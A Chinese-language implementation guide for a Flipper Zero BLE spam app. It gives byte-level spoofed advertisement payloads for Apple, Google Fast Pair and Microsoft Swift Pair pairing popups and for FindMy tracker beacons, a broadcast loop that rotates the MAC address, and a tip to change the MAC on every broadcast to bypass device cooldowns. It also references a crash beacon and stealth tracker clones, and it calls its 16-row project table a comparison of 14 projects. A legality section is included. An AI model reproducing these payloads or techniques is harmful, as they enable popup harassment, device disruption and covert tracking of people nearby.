# Flipper Zero BLE 实装深度指南 — X-BLE Spam / X-FindMy / extra_beacon 生态

> 作者: dwgx · 最终更新: 2026-04-05
> 实机验证: Flipper Zero firmware 1.4.3 (OFW) · WB55 BLE stack
> 覆盖: 公共 `furi_hal_bt_extra_beacon_*` API · 14 个开源项目横向对比 · 协议矩阵 · 代码模式分类

---

## 0. 本文档的定位

Flipper Zero 在 OFW (官方固件) 下做 BLE 广播类应用，受到**极严格的 API 限制**。市面上大多数 BLE spam 项目都依赖第三方固件暴露的接口，这使得大量教程对 OFW 用户不可复现。

本文档的目标是：

1. **只用 OFW 公开 API** (`furi_hal_bt_extra_beacon_*`) 讲清楚整条实装路径
2. 对比 14 个已知 BLE spam / beacon / advertiser 项目，梳理代码模式
3. 给出协议矩阵、逆向资料出处、合法合规边界
4. 作为 OSS 公开项目的基础资料

---

## 1. Flipper BLE Stack 架构与 API 边界

### 1.1 OFW 公开给外部 app 的 BLE API

| API | 用途 | OFW 外部 app 可调用 |
|---|---|---|
| `furi_hal_bt_extra_beacon_set_config()` | 配置额外广播参数 | ✅ |
| `furi_hal_bt_extra_beacon_set_data()` | 写入 31 字节 payload | ✅ |
| `furi_hal_bt_extra_beacon_start/stop()` | 启停额外广播 | ✅ |
| `furi_hal_bt_extra_beacon_get_config/get_data()` | 保存/恢复原配置 | ✅ |
| `furi_hal_bt_extra_beacon_is_active()` | 查询状态 | ✅ |
| `furi_hal_bt_start_advertising()` | GATT 正常广播 | ✅ (受限) |
| `ble_scan_*` | 扫描周边广播 | ❌ OFW 锁定 |
| `ble_central_*` | Central 角色连接 | ❌ OFW 锁定 |
| 原生 HCI command | ACI 直接下发 | ❌ 崩栈 |

### 1.2 核心数据结构（来自 `targets/f7/ble_glue/extra_beacon.h`）

```c
typedef struct {
    uint16_t min_adv_interval_ms;
    uint16_t max_adv_interval_ms;
    GapAdvChannelMap     adv_channel_map;   // 37/38/39 位图
    GapAdvPowerLevelInd  adv_power_level;   // -40dBm..+6dBm (0x00..0x1F)
    GapAddressType       address_type;      // Public=0, Random=1
    uint8_t              address[6];
} GapExtraBeaconConfig;

#define EXTRA_BEACON_MAX_DATA_SIZE   31
#define EXTRA_BEACON_MAC_ADDR_SIZE    6
```

**关键约束（来自 BLE Core Spec 5.0 + WB55 stack）:**

- `payload ≤ 31 bytes` 是硬上限，AirDrop HEADER_LEN+18=28 字节已经逼近极限
- `min_adv_interval_ms < 100` 会导致 WB55 栈不稳定，Momentum 默认 `min=100, max=150`
- `address_type = Public` 被 iOS/macOS **静默忽略**，必须用 `Random`
- Random Static address 规则：`mac[5] |= 0xC0` (高 2 bit = `0b11`)

### 1.3 第三方固件解锁的能力差异

| 能力 | OFW | Momentum | Xtreme | Unleashed | RogueMaster |
|---|---|---|---|---|---|
| `extra_beacon_*` | ✅ (v0.88+) | ✅ | ✅ | ✅ | ✅ |
| GATT peripheral | ✅ | ✅ | ✅ | ✅ | ✅ |
| BLE Scan / Observer | ❌ | ✅ | ✅ | ✅ | ✅ |
| BLE Central 连接 | ❌ | 部分 | 部分 | 限制 | 限制 |
| Raw HCI passthrough | ❌ | ❌ | ❌ | ❌ | ❌ |

OFW 刻意隐藏 `ble_scan` 和 central 角色——WB55 栈只有**一个连接槽位**，OFW 保留给官方 mobile companion 用。第三方固件通过 patch `ble_glue/gap.c` 释放给外部 app。

---

## 2. 14 个开源项目横向对比

截至 2026-04 的调研结果（star 数、最后推送时间为该时点抓取）：

| # | 项目 | 平台 | 语言 | 许可证 | Stars | 最后推送 | 定位 |
|---|---|---|---|---|---|---|---|
| 1 | [Next-Flip/Momentum-Apps](https://github.com/Next-Flip/Momentum-Apps) (`ble_spam/`) | Flipper Momentum | C | 未指定 | 560 | 2026-03 | 规范级维护的 BLE Spam，Willy-JL 的官方延续 |
| 2 | [Next-Flip/Momentum-Firmware](https://github.com/Next-Flip/Momentum-Firmware) | Flipper FW | C | GPL-3.0 | 8.3k | 2026-03 | 提供 extra_beacon HAL 扩展 |
| 3 | [Flipper-XFW/Xtreme-Apps](https://github.com/Flipper-XFW/Xtreme-Apps) | Flipper Xtreme | C | 未指定 | 293 | 2024-07 | Momentum ble_spam 的上游（已归档） |
| 4 | [DarkFlippers/unleashed-firmware](https://github.com/DarkFlippers/unleashed-firmware) | Flipper Unleashed | C | GPL-3.0 | 21.3k | 2026-04 | 同样提供 `furi_hal_bt_extra_beacon_*` |
| 5 | [RogueMaster/flipperzero-firmware-wPlugins](https://github.com/RogueMaster/flipperzero-firmware-wPlugins) | Flipper FW | C | GPL-3.0 | 6.1k | 2026-04 | 聚合固件，预装 BLE Spam |
| 6 | [flipperdevices/flipperzero-firmware](https://github.com/flipperdevices/flipperzero-firmware) | Flipper OFW | C | GPL-3.0 | ~15k | 活跃 | **定义 `extra_beacon.h` 原语 API** |
| 7 | [MatthewKuKanich/FindMyFlipper](https://github.com/MatthewKuKanich/FindMyFlipper) | Flipper | C + Py | 未指定 | 2.1k | 2025-04 | AirTag / SmartTag / Tile 克隆 |
| 8 | [ECTO-1A/AppleJuice](https://github.com/ECTO-1A/AppleJuice) | ESP32/Pi/M5 | Py/C++ | Apache-2.0 | 1.9k | 2024-06 | Apple proximity pair 伪造的参考实现 |
| 9 | [RapierXbox/ESP32-Sour-Apple](https://github.com/RapierXbox/ESP32-Sour-Apple) | ESP32 | C++/Py | 未指定 | 581 | 2024-06 | iOS 17 crash beacon 跨平台变体 |
| 10 | [John4E656F/fl-BLE_SPAM](https://github.com/John4E656F/fl-BLE_SPAM) | Flipper | C | 未指定 | 131 | 2023-10 | 早期 BLE spam 实验 |
| 11 | [user2169420inOhio/Flipper-Zero-Apple-BLE-Spammer](https://github.com/user2169420inOhio/Flipper-Zero-Apple-BLE-Spammer) | Flipper OFW | C | 未指定 | 75 | 2025-09 | **OFW-only** Apple spam 实现 |
| 12 | [seemoo-lab/openhaystack](https://github.com/seemoo-lab/openhaystack) | macOS/ESP32/nRF | Swift/C | AGPL-3.0 | 12.8k | 2024-07 | FindMy 起源，SECP224R1 推导 |
| 13 | [dchristl/macless-haystack](https://github.com/dchristl/macless-haystack) | 跨平台 | Dart/Py | 未指定 | 2.0k | 2026-03 | 不依赖 Apple 硬件的 OpenHaystack |
| 14 | [biemster/FindMy](https://github.com/biemster/FindMy) | PC | Python | 未指定 | 678 | 2024-12 | FindMy 云端查询客户端参考 |
| 15 | [furiousMAC/continuity](https://github.com/furiousMAC/continuity) | Wireshark | C/Lua | GPL-2.0 | 645 | 2026-02 | **Apple Continuity 协议逆向圣经** |
| 16 | [positive-security/find-you](https://github.com/positive-security/find-you) | ESP32 | Swift/C | AGPL-3.0 | 1.2k | 2022-02 | 隐身 AirTag clone 概念验证 |

说明：`Willy-JL/FlipperZero-BLE-Spam` 独立仓库已不存在（404），代码现在在 `Next-Flip/Momentum-Apps/ble_spam/`，源文件里仍保留 `// Hacked together by @Willy-JL` 署名。

---

## 3. 协议 × 项目 覆盖矩阵

| 协议 | Momentum ble_spam | Xtreme | AppleJuice | Sour Apple | FindMyFlipper | OpenHaystack | furiousMAC |
|---|---|---|---|---|---|---|---|
| Apple Proximity Pair (0x07) | ✅ full | ✅ full | ✅ full | △ partial | ❌ | ❌ | 📚 reference |
| Apple Nearby Action (0x0F) | ✅ full | ✅ full | △ partial | ✅ full | ❌ | ❌ | 📚 reference |
| Apple AirDrop (0x05) | ✅ full | ✅ full | ❌ | ❌ | ❌ | ❌ | 📚 reference |
| Apple Handoff | ✅ full | ✅ full | ❌ | ❌ | ❌ | ❌ | 📚 reference |
| Apple NearbyInfo (0x10) | ✅ full | ✅ full | ❌ | ❌ | ❌ | ❌ | 📚 reference |
| Apple AirPlay Target (0x09) | ✅ full | ✅ full | ❌ | ❌ | ❌ | ❌ | 📚 reference |
| Apple FindMy / OF (0x12) | ❌ | ❌ | ❌ | ❌ | ✅ full | ✅ full | △ partial |
| Google Fast Pair (0xFE2C) | ✅ full | ✅ full | ❌ | ❌ | ❌ | ❌ | ❌ |
| Samsung EasySetup (0x0075) | ✅ full | ✅ full | ❌ | ❌ | △ SmartTag | ❌ | ❌ |
| Microsoft Swift Pair (0x0006) | ✅ full | ✅ full | ❌ | ❌ | ❌ | ❌ | ❌ |
| LoveSpouse | ✅ full | ✅ full | ❌ | ❌ | ❌ | ❌ | ❌ |
| iBeacon | ❌ (OFW 样例) | ❌ | ❌ | ❌ | △ | ❌ | ❌ |
| Tile | ❌ | ❌ | ❌ | ❌ | ✅ full | ❌ | ❌ |
| Samsung SmartTag | ❌ | ❌ | ❌ | ❌ | ✅ full | ❌ | ❌ |

**结论:**
- **广度第一**: Momentum `ble_spam/` — 11 种协议，多模式切换
- **持续追踪器**: FindMyFlipper — AirTag / SmartTag / Tile 覆盖
- **云端定位闭环**: OpenHaystack + macless-haystack
- **协议考古**: furiousMAC/continuity 是所有 fork 的字段表出处

---

## 4. 代码架构模式分类（四大派系）

研究 14 个项目后，提炼出的实装模式：

### 派系 1: Static-Array 静态数组
**代表**: AppleJuice, Sour Apple
**做法**: 每个攻击类型硬编码一个 `uint8_t payload[N]`，通过索引切换
**优点**: 最易阅读、最易 fork-and-modify
**缺点**: 无运行时变异、无随机化
**适用**: 单协议 demo、教学代码

### 派系 2: Table-of-Structs + Builder Switch 结构表+构造器分派
**代表**: Momentum `ble_spam/protocols/continuity.c`
**做法**: `typedef enum ContinuityType` 索引一个 `switch(type)` 分派到构造器，写入 packet buffer
**优点**: 支持部分随机化、payload 模式切换（Random/Value/Bruteforce）、每个子设备可配颜色/型号表
**代码位置**: `continuity.c:197-222` 定义 `ContinuityType` enum + `packet_sizes[]` LUT
**适用**: **多协议瑞士军刀**

### 派系 3: Function-Pointer Protocol Registry 函数指针协议注册表
**代表**: Momentum `ble_spam/protocols/_protocols.c`
**做法**: `Protocol* protocols[]` 每项带 `.make_packet()` 回调
**优点**: 新增协议 = 新增一个文件，UI scene 与 packet builder 彻底解耦
**适用**: 需要长期扩展的项目

### 派系 4: Crypto-Derived Runtime Payload 密码学驱动的运行时载荷
**代表**: FindMyFlipper, OpenHaystack
**做法**: SECP224R1 密钥派生出广播内容、MAC 从公钥 bit 取
**特征**: 跨广播轮次保持状态
**适用**: FindMy 追踪器

**选型建议:**

| 你的目标 | 推荐模式 |
|---|---|
| 单协议 demo | 派系 1 |
| 多协议 app | 派系 3 |
| FindMy 追踪器 | 派系 4 |

---

## 5. 各协议 Packet Format 详解（含 gotcha）

### 5.1 Apple Proximity Pair (Continuity 0x07)

```c
uint8_t payload[27] = {
    0x1E,                  // 总长度
    0xFF,                  // AD type: Manufacturer Specific
    0x4C, 0x00,            // Company ID: Apple (LE)
    0x07,                  // Continuity: Proximity Pair
    0x19,                  // subtype 长度
    model_hi, model_lo,    // 如 0x07,0x20 = AirPods Pro
    0x55,                  // status byte
    battery1,              // 见下方 gotcha
    battery2,
    lid_open_counter,      // rand() % 256
    dev_color,
    0x00,                  // padding
    /* 16 字节 encrypted payload (全零也能触发) */
    0,0,0,0, 0,0,0,0, 0,0,0,0, 0,0,0,0
};
```

**电池字节争议 (重要)**:
- Momentum `continuity.c:313`: `((rand()%10)<<4) + (rand()%10)` → BCD 风格，取值 0x00–0x99
- 本仓库本地 `x_ble_spam` CLAUDE.md 记录: `rand() % 16`
- Apple 内部按 4-bit 解析（0–0xF）

**两个版本都能让 AirPods 弹窗，但 Beats Flex/Solo 对越界 nibble 敏感**。发布前必须在目标设备上实测。

**设备型号代码片段** (来自 Momentum + AppleJuice):

| 型号 | Code |
|---|---|
| AirPods | `0x0220` |
| AirPods Pro | `0x0E20` |
| AirPods Max | `0x0055` |
| AirPods 2 | `0x0F20` / `0x0030` |
| Beats Flex | `0x1020` |
| Beats Solo3 | `0x0620` |
| PowerBeats Pro | `0x0B20` |

**前缀字节 (from Momentum `continuity.c:307`)**:
- `0x05`: AirPods Max (0x0055) & AirPods 2 (0x0030)
- `0x01`: 其他 paired 设备
- `0x07`: 新设备 pair 状态

### 5.2 Apple Nearby Action (Continuity 0x0F)

```c
uint8_t payload[14] = {
    0x0D, 0xFF, 0x4C, 0x00,
    0x0F,                  // Continuity: Nearby Action
    0x05,                  // subtype 长度
    flags,                 // 0xC0 通常 / 0xBF = Join AppleTV
    action_type,           // 见下表
    rand_a, rand_b, rand_c,
    0x00, 0x00, 0x00
};
```

**Action Type 对照表** (from furiousMAC FIELDS.md):

| Action | Value | 现行状态 |
|---|---|---|
| Setup New iPhone | `0x09` | iOS 16.6+ 已修复 |
| Transfer Number | `0x02` | 有效 |
| AppleTV Pair | `0x0F` | 有效 |
| Join AppleTV | `0x13` | 需 flags=0xBF |
| AutoFill | `0x08` | iOS 16+ 修复 |
| iOS 17 Crash | `0x11`/others | iOS 17.2 修复 |

### 5.3 Google Fast Pair (Service UUID 0xFE2C)

```c
uint8_t payload[14] = {
    0x03, 0x03, 0x2C, 0xFE,     // Complete Service UUIDs: 0xFE2C
    0x06, 0x16, 0x2C, 0xFE,     // Service Data UUID: 0xFE2C
    mid[0], mid[1], mid[2],     // Fast Pair Model ID (24-bit)
    0x00, 0x00, 0x00
};
```

随机 model ID 仍会弹窗（视为未注册设备），已注册的如 `0xD446B4` = Bose QC35 会显示品牌图标。Android 12+ 引入频率节流。

### 5.4 Microsoft Swift Pair (Manufacturer 0x0006)

```c
uint8_t payload[16] = {
    0x0F, 0xFF, 0x06, 0x00,     // Manufacturer: Microsoft
    0x03, 0x00, 0x80,           // Swift Pair header
    0x06,                       // device type: Mouse
    'F','l','i','p','p','e','r','Z'  // Display Name (UTF-8)
};
```

Windows 11 自动弹 "Add Device" toast。23H2+ 启用频率限制：连续 3 次后 60 秒冷却。

### 5.5 Apple Offline Finding / FindMy (Continuity 0x12)

```c
uint8_t payload[31] = {
    0x1E, 0xFF, 0x4C, 0x00,
    0x12, 0x19,                       // FindMy frame
    0x00,                             // status
    key_hash[2..27],                  // 28 字节 SECP224R1 公钥 bit 2..223
    key_hash[0] >> 6,                 // 剩余 2 bit
    0x00                              // padding
};
// MAC address = key_hash[0..5], mac[0] |= 0xC0
```

来源: `MatthewKuKanich/FindMyFlipper/FindMyFlipper/findmy.c`

---

## 6. 核心广播循环（通用模板）

```c
static void broadcast_loop(BleSpamApp* app) {
    while(app->running) {
        if(!app->broadcasting) { furi_delay_ms(100); continue; }

        uint32_t now = furi_get_tick();
        if(now - app->mac_rotate_ts > 3000) {
            uint8_t mac[6];
            furi_hal_random_fill_buf(mac, 6);
            mac[5] |= 0xC0;  // Static Random Address 规则

            GapExtraBeaconConfig cfg = {
                .min_adv_interval_ms = 100,  // 勿低于 100
                .max_adv_interval_ms = 150,
                .adv_channel_map = GapAdvChannelMapAll,
                .adv_power_level = GapAdvPowerLevel_0dBm,
                .address_type = GapAddressTypeRandom,
            };
            memcpy(cfg.address, mac, 6);

            furi_hal_bt_extra_beacon_stop();
            furi_hal_bt_extra_beacon_set_config(&cfg);
            furi_hal_bt_extra_beacon_set_data(
                app->devs[app->current_idx].build_payload(&len),
                len);
            furi_hal_bt_extra_beacon_start();
            app->mac_rotate_ts = now;
        }
        furi_delay_ms(50);
    }
}
```

**启动/退出必备保存-恢复模式** (from Momentum `ble_spam.c:651-742`):

```c
// 进入 app
gap_extra_beacon_get_config(&orig_cfg);
gap_extra_beacon_get_data(orig_data, &orig_len);
// ... 广播工作 ...
// 退出 app
furi_hal_bt_extra_beacon_stop();
gap_extra_beacon_set_config(&orig_cfg);
gap_extra_beacon_set_data(orig_data, orig_len);
furi_hal_bt_start_advertising();
```

**不做恢复 = Flipper 本机 BT 死掉**。

---

## 7. 9 个踩坑清单（Gotchas）

1. **电池字节范围**: Momentum 用 `%10` (BCD)，本地 x_ble_spam 用 `%16`。Beats 对越界敏感，发布前必须实测。
2. **MAC 高 2 bit**: Random Static address 必须 `mac[5] |= 0xC0`。不做这一步 iOS 静默忽略。
3. **Continuity type bytes**: `0x07 0x0F 0x10 0x05 0x0C 0x0D 0x0E` — 出自 `furiousMAC/continuity/FIELDS.md`，Apple 从未公开。
4. **Nearby Action flags**: `0xC0` 标准，`0xBF` 专供 Join AppleTV。Momentum `continuity.c` 和 AppleJuice 都有此区分。
5. **iOS 版本收紧**: Setup New iPhone (16.6+), AutoFill (16+), iOS17 Crash (17.2+) 已修复。AirTag 弹窗跨版本稳定。Beats Flex/Solo/Studio 有 per-MAC 60s 冷却，**每次广播换 MAC 即可绕过**。
6. **保存-恢复**: 始终 `_get_config()` + `_get_data()` 入口保存，出口还原。
7. **广播间隔**: Flipper 最小 20ms，但 <100ms 会打爆 WB55。Momentum 默认 `min=100, max=150`，不要降。
8. **`GapAddressTypePublic` 不可用于 FindMy**: Apple OF 网络只索引 Random 地址。
9. **31 字节硬上限**: AirDrop payload `HEADER_LEN+18=28` 已经很紧。加自定义 TLV 必须挤占其他 manufacturer data。

---

## 8. 三个最佳学习路径（给移植者）

| 目标 | 首选参考 | 次选 |
|---|---|---|
| 移植单个 Apple Continuity type 到自己 .fap | `Next-Flip/Momentum-Apps/ble_spam/protocols/continuity.c` (lines 250-400) + `furiousMAC/continuity/FIELDS.md` | `ECTO-1A/AppleJuice` ESP32 sketch |
| 做 FindMy 追踪器信标 | `MatthewKuKanich/FindMyFlipper/FindMyFlipper/findmy.c` | `seemoo-lab/openhaystack` firmware/ |
| 学习 HAL 原语 | `flipperdevices/flipperzero-firmware/applications/examples/example_ble_beacon/` | `extra_beacon.h` + `furi_hal_bt.h` |
| 抓包 + 协议验证 | `furiousMAC/continuity/dissector/4.4.0/` (load to Wireshark) | `biemster/FindMy` |

---

## 9. 合法性与 OSS 公开规范

**允许的使用场景:**
- 自有设备的 BLE 安全测试
- BLE 协议研究与教学
- BLE stack 兼容性验证

**禁止:**
- 对第三方的骚扰行为
- 公共空间无差别 spam
- 针对特定个人的持续广播

**法律参考:**
- 美国 FCC Part 15 (有意辐射器无害原则)
- 日本 電波法 第 59 条 (禁止窃听)
- EU RED Directive 2014/53/EU
- 中国《无线电管理条例》第 34 条

**最佳合法性声明样板:**
- **positive-security/find-you** — 有学术论文背书的披露上下文
- **ECTO-1A/AppleJuice** — Apache-2.0 + 明确教育/授权测试声明
- **seemoo-lab/openhaystack** — AGPL-3.0 + TU Darmstadt SEEMOO 学术背景

**复制 OSS README 时直接抄这三家的 disclaimer。**

---

## 10. OSS 公开的推荐仓库结构

```
x_ble_spam/
├── README.md                  # 项目概览 + 合法性
├── LICENSE                    # GPL-3.0 (匹配 Flipper SDK)
├── application.fam
├── x_ble_spam.c
├── protocols/                 # 派系 3 模式
│   ├── _protocols.c           # 注册表
│   ├── continuity.c
│   ├── fastpair.c
│   ├── easysetup.c
│   ├── swiftpair.c
│   ├── lovespouse.c
│   └── nameflood.c
├── views/
│   ├── main_view.c
│   └── config_view.c
├── docs/
│   ├── ARCHITECTURE.md        # 本文档节选
│   ├── PACKET_FORMATS.md      # 每协议字节级
│   ├── PROTOCOL_TABLE.md      # 11x14 矩阵
│   ├── COMPATIBILITY.md       # iOS/Android/Windows 版本
│   └── FAQ.md
└── examples/
    ├── add_new_device.md
    └── add_new_protocol.md
```

---

## 11. 今后扩展方向

- [ ] Tile / Samsung SmartTag 加入 (OF 同系)
- [ ] Continuity v2 (iOS 17+ 新 framing) 逆向
- [ ] GATT peripheral "fake device" 模式 (via `furi_hal_bt_start_advertising` 分支)
- [ ] qFlipper plugin 动态添加 device definition
- [ ] Web UI payload 可视化编辑器
- [ ] CI: Wireshark 解析验证每个 payload 的 furiousMAC 字段合法性

---

## 参考资料

- Momentum BLE Spam: https://github.com/Next-Flip/Momentum-Apps/tree/dev/ble_spam
- Flipper extra_beacon: https://github.com/flipperdevices/flipperzero-firmware/blob/dev/targets/f7/ble_glue/extra_beacon.h
- ECTO-1A AppleJuice: https://github.com/ECTO-1A/AppleJuice
- furiousMAC continuity: https://github.com/furiousMAC/continuity
- FindMyFlipper: https://github.com/MatthewKuKanich/FindMyFlipper
- OpenHaystack: https://github.com/seemoo-lab/openhaystack
- RapierXbox Sour Apple: https://github.com/RapierXbox/ESP32-Sour-Apple
- positive-security find-you: https://github.com/positive-security/find-you
- macless-haystack: https://github.com/dchristl/macless-haystack
- biemster FindMy: https://github.com/biemster/FindMy
